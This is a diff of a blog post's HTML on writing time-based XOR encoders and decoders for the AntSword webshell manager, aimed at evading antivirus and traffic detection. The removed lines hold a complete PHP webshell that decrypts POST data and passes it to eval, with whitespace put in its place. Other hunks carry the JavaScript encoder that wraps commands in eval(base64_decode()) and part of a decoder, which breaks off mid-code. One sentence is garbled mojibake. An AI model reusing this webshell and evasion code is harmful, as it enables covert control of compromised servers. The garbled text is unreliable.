@@ -10,13 +10,12 @@
     <title>蚁剑实现动态秘钥编码器解码器 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="蚁剑实现动态秘钥编码器解码器" />
 <meta property="og:description" content="1 前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用 但是这个模块大多数情况下是不开的，所以就导" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/antsword-xor-encoder/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-xor-encoder/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-10-15T09:43:37+00:00" />
 <meta property="article:modified_time" content="2019-10-15T09:43:37+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="蚁剑实现动态秘钥编码器解码器"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="蚁剑实现动态秘钥编码器解码器"/>
 <meta name="twitter:description" content="1 前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用 但是这个模块大多数情况下是不开的，所以就导"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -35,7 +34,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder\/"
-        },"genre": "posts","keywords": "免杀, 中国蚁剑","wordcount":  2541 ,
+        },"genre": "posts","keywords": "免杀, 中国蚁剑","wordcount":  2469 ,
         "url": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder\/","datePublished": "2019-10-15T09:43:37+00:00","dateModified": "2019-10-15T09:43:37+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -161,7 +160,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
                 </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2541 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2469 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -200,73 +199,13 @@
 <p>看一下他的shell.php是怎么写的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">@error_reporting(0);
-</span></span><span class="line"><span class="cl">session_start();
-</span></span><span class="line"><span class="cl">if (isset($_GET[&#39;pass&#39;]))
-</span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">    $key=substr(md5(uniqid(rand())),16);
-</span></span><span class="line"><span class="cl">    $_SESSION[&#39;k&#39;]=$key;
-</span></span><span class="line"><span class="cl">    print $key;
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">else
-</span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">    $key=$_SESSION[&#39;k&#39;];
-</span></span><span class="line"><span class="cl">	$post=file_get_contents(&#34;php://input&#34;);
-</span></span><span class="line"><span class="cl">	if(!extension_loaded(&#39;openssl&#39;))
-</span></span><span class="line"><span class="cl">	{
-</span></span><span class="line"><span class="cl">		$t=&#34;base64_&#34;.&#34;decode&#34;;
-</span></span><span class="line"><span class="cl">		$post=$t($post.&#34;&#34;);
-</span></span><span class="line"><span class="cl">		
-</span></span><span class="line"><span class="cl">		for($i=0;$i&lt;strlen($post);$i++) {
-</span></span><span class="line"><span class="cl">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
-</span></span><span class="line"><span class="cl">    			}
-</span></span><span class="line"><span class="cl">	}
-</span></span><span class="line"><span class="cl">	else
-</span></span><span class="line"><span class="cl">	{
-</span></span><span class="line"><span class="cl">		$post=openssl_decrypt($post, &#34;AES128&#34;, $key);
-</span></span><span class="line"><span class="cl">	}
-</span></span><span class="line"><span class="cl">    $arr=explode(&#39;|&#39;,$post);
-</span></span><span class="line"><span class="cl">    $func=$arr[0];
-</span></span><span class="line"><span class="cl">    $params=$arr[1];
-</span></span><span class="line"><span class="cl">	class C{public function __construct($p) {eval($p.&#34;&#34;);}}
-</span></span><span class="line"><span class="cl">	@new C($params);
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 </span></span><span class="line"><span class="cl">?&gt;
 </span></span></code></pre></td></tr></table>
 </div>
@@ -285,16 +224,16 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if(!extension_loaded(&#39;openssl&#39;))
-</span></span><span class="line"><span class="cl">	{
-</span></span><span class="line"><span class="cl">		$t=&#34;base64_&#34;.&#34;decode&#34;;
-</span></span><span class="line"><span class="cl">		$post=$t($post.&#34;&#34;);
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">extension_loaded</span><span class="p">(</span><span class="s1">&#39;openssl&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="o">$</span><span class="n">t</span><span class="o">=</span><span class="s2">&#34;base64_&#34;</span><span class="o">.</span><span class="s2">&#34;decode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="o">$</span><span class="n">post</span><span class="o">=$</span><span class="n">t</span><span class="p">(</span><span class="o">$</span><span class="n">post</span><span class="o">.</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">		
-</span></span><span class="line"><span class="cl">		for($i=0;$i&lt;strlen($post);$i++) {
-</span></span><span class="line"><span class="cl">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
-</span></span><span class="line"><span class="cl">    			}
-</span></span><span class="line"><span class="cl">	}
-</span></span><span class="line"><span class="cl">	else  xxxxxx
+</span></span><span class="line"><span class="cl">		<span class="k">for</span><span class="p">(</span><span class="o">$</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">$</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">post</span><span class="p">);</span><span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    			 <span class="o">$</span><span class="n">post</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">$</span><span class="n">post</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span><span class="o">^$</span><span class="n">key</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>  <span class="n">xxxxxx</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果没有<code>openssl</code>扩展，那么就把postçåå®¹è·éæºç§é¥key异或一遍</p>
@@ -467,61 +406,61 @@
 </span><span class="lnt">55
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
-</span></span><span class="line"><span class="cl">// code by yzddmr6
-</span></span><span class="line"><span class="cl">/*
-</span></span><span class="line"><span class="cl">* @param  {String} pwd   连接密码
-</span></span><span class="line"><span class="cl">* @param  {Array}  data  编码器处理前的 payload 数组
-</span></span><span class="line"><span class="cl">* @return {Array}  data  编码器处理后的 payload 数组
-</span></span><span class="line"><span class="cl">*/
-</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext={}) =&gt; {
-</span></span><span class="line"><span class="cl">  function xor(payload){
-</span></span><span class="line"><span class="cl">    let crypto = require(&#39;crypto&#39;);
-</span></span><span class="line"><span class="cl">    Object.assign(Date.prototype, {
-</span></span><span class="line"><span class="cl">        switch (time) {
-</span></span><span class="line"><span class="cl">            let date = {
-</span></span><span class="line"><span class="cl">                &#34;yy&#34;: this.getFullYear(),
-</span></span><span class="line"><span class="cl">                &#34;MM&#34;: this.getMonth() + 1,
-</span></span><span class="line"><span class="cl">                &#34;dd&#34;: this.getDate(),
-</span></span><span class="line"><span class="cl">                &#34;hh&#34;: this.getHours(),
-</span></span><span class="line"><span class="cl">                &#34;mm&#34;: this.getMinutes(),
-</span></span><span class="line"><span class="cl">                &#34;ss&#34;: this.getSeconds()
-</span></span><span class="line"><span class="cl">            };
-</span></span><span class="line"><span class="cl">            if (/(y+)/i.test(time)) {
-</span></span><span class="line"><span class="cl">                time = time.replace(RegExp.$1, (this.getFullYear() + &#39;&#39;).substr(4 - RegExp.$1.length));
-</span></span><span class="line"><span class="cl">            }
-</span></span><span class="line"><span class="cl">            Object.keys(date).forEach(function (i) {
-</span></span><span class="line"><span class="cl">                if (new RegExp(&#34;(&#34; + i + &#34;)&#34;).test(time)) {
-</span></span><span class="line"><span class="cl">                    if (RegExp.$1.length == 2) {
-</span></span><span class="line"><span class="cl">                        date[i] &lt; 10 ? date[i] = &#39;0&#39; + date[i] : date[i];
-</span></span><span class="line"><span class="cl">                    }
-</span></span><span class="line"><span class="cl">                    time = time.replace(RegExp.$1, date[i]);
-</span></span><span class="line"><span class="cl">                }
-</span></span><span class="line"><span class="cl">            })
-</span></span><span class="line"><span class="cl">            return time;
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    })
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">code</span> <span class="n">by</span> <span class="n">yzddmr6</span>
+</span></span><span class="line"><span class="cl"><span class="o">/*</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="err">@</span><span class="n">param</span>  <span class="p">{</span><span class="ne">String</span><span class="p">}</span> <span class="n">pwd</span>   <span class="err">连接密码</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="err">@</span><span class="n">param</span>  <span class="p">{</span><span class="ne">Array</span><span class="p">}</span>  <span class="n">data</span>  <span class="err">编码器处理前的</span> <span class="n">payload</span> <span class="err">数组</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="err">@</span><span class="k">return</span> <span class="p">{</span><span class="ne">Array</span><span class="p">}</span>  <span class="n">data</span>  <span class="err">编码器处理后的</span> <span class="n">payload</span> <span class="err">数组</span>
+</span></span><span class="line"><span class="cl"><span class="o">*/</span>
+</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">ext</span><span class="o">=</span><span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">xor</span><span class="p">(</span><span class="n">payload</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">crypto</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">Object</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">Date</span><span class="o">.</span><span class="n">prototype</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="n">time</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">date</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;yy&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getFullYear</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;MM&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getMonth</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;dd&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getDate</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;hh&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getHours</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;mm&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getMinutes</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;ss&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getSeconds</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">/</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="p">)</span><span class="o">/</span><span class="n">i</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">time</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">RegExp</span><span class="o">.$</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getFullYear</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="n">RegExp</span><span class="o">.$</span><span class="mf">1.</span><span class="n">length</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">Object</span><span class="o">.</span><span class="n">keys</span><span class="p">(</span><span class="n">date</span><span class="p">)</span><span class="o">.</span><span class="n">forEach</span><span class="p">(</span><span class="n">function</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">new</span> <span class="n">RegExp</span><span class="p">(</span><span class="s2">&#34;(&#34;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s2">&#34;)&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">time</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">RegExp</span><span class="o">.$</span><span class="mf">1.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="err">?</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">:</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">RegExp</span><span class="o">.$</span><span class="mi">1</span><span class="p">,</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">})</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">time</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
 </span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    let newDate = new Date();
-</span></span><span class="line"><span class="cl">    let time = newDate.switch(&#39;yyyy-MM-dd hh:mm&#39;);
-</span></span><span class="line"><span class="cl">    let key = crypto.createHash(&#39;md5&#39;).update(time).digest(&#39;hex&#39;)
-</span></span><span class="line"><span class="cl">    key=key.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
-</span></span><span class="line"><span class="cl">    //let payload=&#34;phpinfo();&#34;;
-</span></span><span class="line"><span class="cl">    let cipher = payload.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
-</span></span><span class="line"><span class="cl">    for(let i=0;i&lt;cipher.length;i++){
-</span></span><span class="line"><span class="cl">        cipher[i]=cipher[i]^key[i%32]
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&#34;&#34;)
-</span></span><span class="line"><span class="cl">    cipher=Buffer.from(cipher).toString(&#39;base64&#39;);
-</span></span><span class="line"><span class="cl">    //console.log(cipher)
-</span></span><span class="line"><span class="cl">    return cipher;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
-</span></span><span class="line"><span class="cl">  data[pwd] = `eval(base64_decode(&#34;${data[&#39;_&#39;]}&#34;));`;
-</span></span><span class="line"><span class="cl">  data[pwd]=xor(data[pwd]);
-</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
-</span></span><span class="line"><span class="cl">  return data;
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">newDate</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Date</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">time</span> <span class="o">=</span> <span class="n">newDate</span><span class="o">.</span><span class="k">switch</span><span class="p">(</span><span class="s1">&#39;yyyy-MM-dd hh:mm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">key</span> <span class="o">=</span> <span class="n">crypto</span><span class="o">.</span><span class="n">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">time</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">let</span> <span class="n">payload</span><span class="o">=</span><span class="s2">&#34;phpinfo();&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">let</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">cipher</span><span class="o">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="mi">32</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span><span class="o">=</span><span class="n">cipher</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span><span class="o">=&gt;</span><span class="ne">String</span><span class="o">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">t</span><span class="p">))</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span><span class="o">=</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cipher</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]</span> <span class="o">=</span> <span class="err">`</span><span class="n">eval</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="s2">&#34;${data[&#39;_&#39;]}&#34;</span><span class="p">));</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]</span><span class="o">=</span><span class="n">xor</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">delete</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png">
@@ -606,74 +545,74 @@
 </span><span class="lnt">68
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
-</span></span><span class="line"><span class="cl">//code by yzddmr6
-</span></span><span class="line"><span class="cl">module.exports = {
-</span></span><span class="line"><span class="cl">  /**
-</span></span><span class="line"><span class="cl">   * @returns {string} asenc 将返回数据base64编码
-</span></span><span class="line"><span class="cl">   * 自定义输出函数名称必须为 asenc
-</span></span><span class="line"><span class="cl">   * 该函数使用的语法需要和shell保持一致
-</span></span><span class="line"><span class="cl">   */
-</span></span><span class="line"><span class="cl">  asoutput: () =&gt; {
-</span></span><span class="line"><span class="cl">    return `function asenc($out){
-</span></span><span class="line"><span class="cl">      date_default_timezone_set(&#34;PRC&#34;);
-</span></span><span class="line"><span class="cl">      $key=md5(date(&#34;Y-m-d H:i&#34;,time()));
-</span></span><span class="line"><span class="cl">      for($i=0;$i&lt;strlen($out);$i++){
-</span></span><span class="line"><span class="cl">          $out[$i] = $out[$i] ^ $key[$i%32];
-</span></span><span class="line"><span class="cl">      }
-</span></span><span class="line"><span class="cl">      return @base64_encode($out);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    `.replace(/\n\s+/g, &#39;&#39;);
-</span></span><span class="line"><span class="cl">  },
-</span></span><span class="line"><span class="cl">  /**
-</span></span><span class="line"><span class="cl">   * 解码 Buffer
-</span></span><span class="line"><span class="cl">   * @param {string} data 要被解码的 Buffer
-</span></span><span class="line"><span class="cl">   * @returns {string} 解码后的 Buffer
-</span></span><span class="line"><span class="cl">   */
-</span></span><span class="line"><span class="cl">  decode_buff: (data, ext={}) =&gt; {
-</span></span><span class="line"><span class="cl">    function xor(payload){
-</span></span><span class="line"><span class="cl">      let crypto = require(&#39;crypto&#39;);
-</span></span><span class="line"><span class="cl">      Object.assign(Date.prototype, {
-</span></span><span class="line"><span class="cl">          switch (time) {
-</span></span><span class="line"><span class="cl">              let date = {
-</span></span><span class="line"><span class="cl">                  &#34;yy&#34;: this.getFullYear(),
-</span></span><span class="line"><span class="cl">                  &#34;MM&#34;: this.getMonth() + 1,
-</span></span><span class="line"><span class="cl">                  &#34;dd&#34;: this.getDate(),
-</span></span><span class="line"><span class="cl">                  &#34;hh&#34;: this.getHours(),
-</span></span><span class="line"><span class="cl">                  &#34;mm&#34;: this.getMinutes(),
-</span></span><span class="line"><span class="cl">                  &#34;ss&#34;: this.getSeconds()
-</span></span><span class="line"><span class="cl">              };
-</span></span><span class="line"><span class="cl">              if (/(y+)/i.test(time)) {
-</span></span><span class="line"><span class="cl">                  time = time.replace(RegExp.$1, (this.getFullYear() + &#39;&#39;).substr(4 - RegExp.$1.length));
-</span></span><span class="line"><span class="cl">              }
-</span></span><span class="line"><span class="cl">              Object.keys(date).forEach(function (i) {
-</span></span><span class="line"><span class="cl">                  if (new RegExp(&#34;(&#34; + i + &#34;)&#34;).test(time)) {
-</span></span><span class="line"><span class="cl">                      if (RegExp.$1.length == 2) {
-</span></span><span class="line"><span class="cl">                          date[i] &lt; 10 ? date[i] = &#39;0&#39; + date[i] : date[i];
-</span></span><span class="line"><span class="cl">                      }
-</span></span><span class="line"><span class="cl">                      time = time.replace(RegExp.$1, date[i]);
-</span></span><span class="line"><span class="cl">                  }
-</span></span><span class="line"><span class="cl">              })
-</span></span><span class="line"><span class="cl">              return time;
-</span></span><span class="line"><span class="cl">          }
-</span></span><span class="line"><span class="cl">      })
